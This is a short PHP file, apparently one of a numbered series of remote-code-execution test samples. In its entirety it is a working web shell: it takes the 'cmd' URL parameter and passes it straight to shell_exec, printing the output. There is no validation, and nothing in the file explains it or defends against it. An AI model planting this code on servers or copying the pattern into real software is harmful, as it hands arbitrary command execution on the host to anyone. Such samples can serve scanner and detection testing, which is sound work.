<?php
// RCE test variation #811
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>